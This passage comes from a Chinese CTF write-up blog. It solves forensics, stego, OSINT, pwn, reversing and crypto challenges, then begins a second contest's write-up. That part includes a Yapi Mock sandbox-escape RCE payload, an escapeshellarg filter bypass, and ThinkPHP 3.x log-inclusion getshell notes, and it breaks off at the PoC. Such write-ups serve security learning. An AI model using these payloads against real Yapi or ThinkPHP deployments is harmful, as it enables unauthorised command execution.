class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] in normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    except:<br>        pass<br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i in range(len(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        del output[a]<br>        del output[a<span class="hljs-number">-1</span>]<br>    except:<br>        pass<br><br><span class="hljs-keyword">for</span> i in range(len(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    except:<br>        pass<br><br><span class="hljs-keyword">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/桌面]<br>└─$ python keyboard2.py capture.pcap<br>flagusbp4ck3tc4ptur31sfun<br>output :flagusbp4ck3tc4ptur31sfun<br></code></pre></td></tr></table></figure><p>最终flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;usb_p4ck3t_c4ptur3_1s_fun&#125;<br></code></pre></td></tr></table></figure><h2 id="Maybe-the-helper-can-help"><a href="#Maybe-the-helper-can-help" class="headerlink" title="Maybe the helper can help*"></a>Maybe the helper can help*</h2><p>You might not see it, but a flag lies within.<br>Flag Format: flag{string}<br><a href="https://defendingthesoc.ctf.cert.rcts.pt/files/381da97acc33337ebd29947e96a64489/the-jetsons-family.jpg?token=.eJyrViotTi2Kz0xRsjI2t9BRKklNzAXzDEG8tMycVAjPuBYAHzcM-w.YRKcRg.4xDdntnvO0prymoRoIRMSZgh-9c">the-jetsons-family.jpg</a></p><p>参考其他人的wp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">使用 stegseek 我们得到的关键短语是 rosie<br>stegseek --crack the-jetsons-family.jpg --wordlist /usr/share/dict/rockyou.txt<br><br>cat the-jetsons-family.jpg.out<br><br>cat the-jetsons-family.jpg.out | base64 -d | base64 -d<br></code></pre></td></tr></table></figure><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Welcome-to-Lisbon"><a href="#Welcome-to-Lisbon" class="headerlink" title="Welcome to Lisbon!"></a>Welcome to Lisbon!</h2><p>Oh, some activists defaced a Victoria Secret’s store.<br>Find out which was the model whose photo was damaged.<br>Flag format: flag{firstname_surname}</p><p>社工题</p><p>welcome_to_lisbon.jpg</p><p><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20210815000735730.png" alt="image-20210815000735730"></p><p>从题目名字我们可以知道这家商店位于葡萄牙的里斯本，谷歌搜索 Victoria Secret  Lisbon可以找到店铺位置</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/000615-289546.png" alt="image-20210815000614963"></p><p>题目所给图片被打码的就是这个模特，搜索Victoria Secret model可以找到是这位模特<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/000704-440418.png" alt="image-20210815000703316"></p><p>阿德瑞娜·利玛 (Adriana Lima)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;adriana_lima&#125;<br></code></pre></td></tr></table></figure><h1 id="Mission"><a href="#Mission" class="headerlink" title="Mission"></a>Mission</h1><h2 id="Something-Suspicious"><a href="#Something-Suspicious" class="headerlink" title="Something Suspicious"></a>Something Suspicious</h2><p><strong>#mission#logging</strong><br>We have detected a strange activity inside our network and manage to get some logs from it.<br>Can you see what happened and if there was a host compromised?<br>Flag format: flag{string}<br><a href="https://defendingthesoc.ctf.cert.rcts.pt/files/30cdb8a4f31d0b27758faeeac7ebda13/ftp.log?token=eyJ1c2VyX2lkIjozNzgsInRlYW1faWQiOjE3OCwiZmlsZV9pZCI6MjV9.YRKddA.92AZrYQTkmEqOoywWMhuxTJv9mE">ftp.log</a><br><a href="https://defendingthesoc.ctf.cert.rcts.pt/files/cebf554150f74e6003e50daaf5397ac2/ssh.log?token=eyJ1c2VyX2lkIjozNzgsInRlYW1faWQiOjE3OCwiZmlsZV9pZCI6Mjl9.YRKddA.lt-3rgM4YA657U2VZWUICCxFi2Y">ssh.log</a>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ftp.log:ZmxhZ3tzMG0zdGgxbmc=  -&gt;  flag&#123;s0m3th1ng<br>ssh.log:X3N1c3AxYzEwdXN9    -&gt;  _susp1c10us&#125;<br></code></pre></td></tr></table></figure><p>最终flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;s0m3th1ng_susp1c10us&#125;<br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Well-hello-there"><a href="#Well-hello-there" class="headerlink" title="Well hello there"></a>Well hello there</h2><p><strong>#pwn#c</strong><br>We initiated the development of a bot. So far it greets you by your name. Can you test it?<br>Access: nc challenges.defsoc.tk 22228<br>Flag format: flag{string}</p><p>拖入IDA查看main函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">76</span>]; // [rsp+0h] [rbp-58h] BYREF<br>  <span class="hljs-built_in">int</span> v5; // [rsp+4Ch] [rbp-Ch]<br><br>  puts(<span class="hljs-string">&quot;Hello there! What is your name?&quot;</span>);<br>  fflush(_bss_start);<br>  v5 = <span class="hljs-number">0</span>;<br>  gets(v4, argv);<br>  <span class="hljs-keyword">if</span> ( v5 )<br>    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    printf(<span class="hljs-string">&quot;Well, hello %s!&quot;</span>, v4);<br>  putchar(<span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>缓冲区溢出,name超过 76 个字符即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ ./program_local        <br>Hello there! What is your name?<br>000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;<br><br><br>$ nc challenges.defsoc.tk 22228   <br>Hello there! What is your name?<br>000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>flag&#123;buff3r_0v3rfl0w_r0cks&#125;<br></code></pre></td></tr></table></figure><p>web手做出的第一个pwn题</p><h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><h2 id="You-are-not-allowed"><a href="#You-are-not-allowed" class="headerlink" title="You are not allowed"></a>You are not allowed</h2><p><strong>#reverse#c</strong><br>Can you reverse this program and get us the flag?<br>Flag format: flag{string}</p><p>这个逆向也很简单，拖入IDA找到main函数，然后F5，可以看到sub_401242函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-keyword">char</span> *s1; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter the secret key : &quot;</span>);<br>  fgets(s, <span class="hljs-number">64</span>, <span class="hljs-built_in">stdin</span>);<br>  s1 = sub_401242();<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, s, <span class="hljs-number">0xF</span>uLL) )<br>    v6 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong key entered! Try again? &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v6 )<br>    sub_401182();<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>找到sub_401242函数，同样F5</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">sub_401242</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v1[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+9h] [rbp-27h] BYREF</span><br>  <span class="hljs-keyword">char</span> *s; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  qmemcpy(v1, <span class="hljs-string">&quot;Sup3rS3cr3tK3y#&quot;</span>, <span class="hljs-keyword">sizeof</span>(v1));<br>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4uLL</span>);<br>  s = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1F</span>uLL);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i &lt;= <span class="hljs-number">0xE</span>; ++i )<br>  &#123;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%c&quot;</span>, (<span class="hljs-keyword">unsigned</span> __int8)v1[i]);<br>    <span class="hljs-built_in">strcat</span>(dest, s);<br>  &#125;<br>  <span class="hljs-keyword">return</span> dest;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到字符串Sup3rS3cr3tK3y#，输入即可得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/桌面]<br>└─$ ./program<br>Enter the secret key : <br>Sup3rS3cr3tK3y<span class="hljs-comment">#</span><br>flag&#123;<span class="hljs-number">1</span>ntr0_t0_r3v3rs3_3ng1n33r1ng&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="A-simple-challenge"><a href="#A-simple-challenge" class="headerlink" title="A simple challenge"></a>A simple challenge</h2><p><strong>#crypto#encoding</strong><br>We have intercepted the following message and we think it has a secret flag in it.<br>Can you decode it?<br>Flag format: flag{string}<br>​</p><p>secret_message.txt：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ==<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">import base64<br>str=<span class="hljs-string">&quot;Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ==&quot;</span><br>num=<span class="hljs-number">0</span>  <br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>        num=num+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;第%d次解码&quot;</span> %(num))<br>        str = base64.b64decode(str.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        str=str.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-keyword">print</span>(str)<br>except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:<br>     <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;END&quot;</span>)      <br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">This is a secret message: flag&#123;<span class="hljs-number">3</span>nc0d1ng_1s_n0t_3ncrypt10n!&#125;<br></code></pre></td></tr></table></figure><h2 id="Roman-encryption"><a href="#Roman-encryption" class="headerlink" title="Roman encryption"></a>Roman encryption</h2><p><strong>#crypto#cipher</strong><br>We intercepted an encrypted communication that was meant to be delivered to a threat actor named Julius.<br>Apparently his name is the key to decipher this message.<br>Can you decipher it?<br>Flag format: flag{string}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">Csddk Rtdetp,<br>Qcghb ykt jko ykto ptmmkoq,<br>Ykt igh tps qcep bsy qk osisevs ykto oswgou: jdgl&#123;<span class="hljs-number">5</span>ta5q1qtq10h_1p_b3y&#125;<br></code></pre></td></tr></table></figure><p><a href="https://quipqiup.com/">https://quipqiup.com/</a>令jdgl=flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Hello Julius, Thank you <span class="hljs-keyword">for</span> your support, You can <span class="hljs-keyword">use</span> <span class="hljs-title">this</span> <span class="hljs-title">key</span> <span class="hljs-title">to</span> <span class="hljs-title">receive</span> <span class="hljs-title">your</span> <span class="hljs-title">reward</span>: <span class="hljs-title">flag</span>&#123;5<span class="hljs-title">um5t1tut10n_1s_k3y</span>&#125;<br></code></pre></td></tr></table></figure><p>提交flag不对，继续查看题目提示，应该是带key的凯撒密码<br>​</p><p>解密网站：<a href="https://www.boxentriq.com/code-breaking/keyed-caesar-cipher">https://www.boxentriq.com/code-breaking/keyed-caesar-cipher</a><br>搜索 Julius得到全称Gaius Julius Caesar，即为key解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Niji ce uni pieebai:<br>Hello Julius,<br>Thank you <span class="hljs-keyword">for</span> your support,<br>You can use this key to receive your reward: flag&#123;5ub5t1tut10n_1s_k3y&#125;<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Hextraordinary-security"><a href="#Hextraordinary-security" class="headerlink" title="Hextraordinary security"></a>Hextraordinary security</h2><p><strong>#crypto#encoding</strong><br>We just found this garbage file.<br>Can you decode it and retrieve any useful information from it?<br>Flag format: flag{string}<br>​</p><p>hex转str</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;h3x4d3c1m4l_4s_4n_0bfusc4t10n_t00l&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;


&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;Some-type-of-juggling&quot;&gt;&lt;a href=&quot;#Some-typ</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>2021DASCTF July X CBCTF 4th</title>
    <link href="http://atkx.top/2021/08/09/2021DASCTF-July-X-CBCTF-4th/"/>
    <id>http://atkx.top/2021/08/09/2021DASCTF-July-X-CBCTF-4th/</id>
    <published>2021-08-09T14:26:42.000Z</published>
    <updated>2021-08-15T04:25:06.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc node<span class="hljs-number">4</span>.buuoj.cn <span class="hljs-number">25870</span>                                                                                                                                                      <span class="hljs-number">1</span> ⨯<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>Try again<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>flag&#123;<span class="hljs-number">30</span>cf<span class="hljs-number">1012</span>-e<span class="hljs-number">303</span><span class="hljs-number">-4</span>caf<span class="hljs-number">-98</span>ba-d<span class="hljs-number">63</span>f<span class="hljs-number">3591e9</span>cd&#125;<br></code></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h4 id="Yapi-Mock-远程命令执行漏洞"><a href="#Yapi-Mock-远程命令执行漏洞" class="headerlink" title="Yapi Mock 远程命令执行漏洞"></a>Yapi Mock 远程命令执行漏洞</h4><p>添加项目—&gt;添加接口—&gt;选择高级Mock—&gt;勾选脚本—&gt;将开启按钮打开—&gt;然后将PoC写在脚本中保存</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> sandbox = <span class="hljs-keyword">this</span><br><span class="hljs-keyword">const</span> ObjectConstructor = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> FunctionConstructor = ObjectConstructor.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> myfun = FunctionConstructor(<span class="hljs-string">&#x27;return process&#x27;</span>)<br><span class="hljs-keyword">const</span> process = myfun()<br>mockJson = process.mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;ls /&amp; cat /ffffffflllllaggggg&quot;</span>).toString()<br></code></pre></td></tr></table></figure><p>访问预览地址，回显命令执行结果getflag</p><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h2><h4 id="非ascii字符绕过escapeshellarg"><a href="#非ascii字符绕过escapeshellarg" class="headerlink" title="非ascii字符绕过escapeshellarg"></a>非ascii字符绕过escapeshellarg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))<br>    &#123;<br>        <span class="hljs-variable">$cmd</span> = escapeshellarg(<span class="hljs-variable">$cmd</span>);<br>        system(<span class="hljs-string">&#x27;cat &#x27;</span> . <span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>hint提示管理员曾访问过flag，查看日志</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?cmd=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><p>得到flag文件为/this_is_final_flag_e2a457126032b42d.php</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">?cmd=<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_f</span>inal<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span>e<span class="hljs-number">2</span>a<span class="hljs-number">457126032</span>b<span class="hljs-number">42</span>d.php<br></code></pre></td></tr></table></figure><p>过滤了flag关键字，配合escapeshellarg函数绕过：<a href="https://www.php.net/manual/zh/function.escapeshellarg.php">https://www.php.net/manual/zh/function.escapeshellarg.php</a></p><p>当escapeshellarg（）从UTF-8字符串中剥离非ASCII字符时，添加以下内容修复了该问题：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;?php<br>setlocale(LC_CTYPE, <span class="hljs-string">&quot;en_US.UTF-8&quot;</span>);<br>?&gt;<br>  <br> Under Windows, this function puts <span class="hljs-built_in">string</span> <span class="hljs-keyword">into</span> double-quotes, <span class="hljs-keyword">not</span> single, <span class="hljs-keyword">and</span> replaces %(percent sign) <span class="hljs-keyword">with</span> a <span class="hljs-literal">space</span>, <span class="hljs-keyword">that</span>&#x27;s why <span class="hljs-keyword">it</span>&#x27;s impossible <span class="hljs-keyword">to</span> pass a filename <span class="hljs-keyword">with</span> percents <span class="hljs-keyword">in</span> <span class="hljs-keyword">its</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">through</span> this function.<br> <br>在Windows下，此函数将字符串放在双引号中，而不是单引号中，并用空格替换%（百分号），这就是为什么无法通过此函数传递名称中带有百分数的文件名的原因。<br></code></pre></td></tr></table></figure><p>在flag字符之间添加一个非ascii字符，然后unicode绕一下flag正则</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">?cmd=this_is_final_fl%faag_e2a457126032b42d.php</span><br><span class="xml"> #</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;flag&#123;cb3043a6-bfe6-4c6d-a75e-fc77e27de779&#125;&#x27;</span>; <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h2><h4 id="ThinkPHP-3-x-日志包含RCE-getshell"><a href="#ThinkPHP-3-x-日志包含RCE-getshell" class="headerlink" title="ThinkPHP 3.x 日志包含RCE getshell"></a>ThinkPHP 3.x 日志包含RCE getshell</h4><p>TP3.2.3日志漏洞:<a href="https://www.thinkphp.cn/topic/58651.html">https://www.thinkphp.cn/topic/58651.html</a></p><p>ThinkPHP3.2.x RCE漏洞通报：<a href="https://cloud.tencent.com/developer/article/1855060">https://cloud.tencent.com/developer/article/1855060</a></p><p>通过输入http://域名/应用名（默认为Application，很多开发者不会改它）/Runtime/Logs/组名（默认为Home或者Index，很多开发者不会改它）/18_08_15.log的方式即可访问日志文件</p><p>POC</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 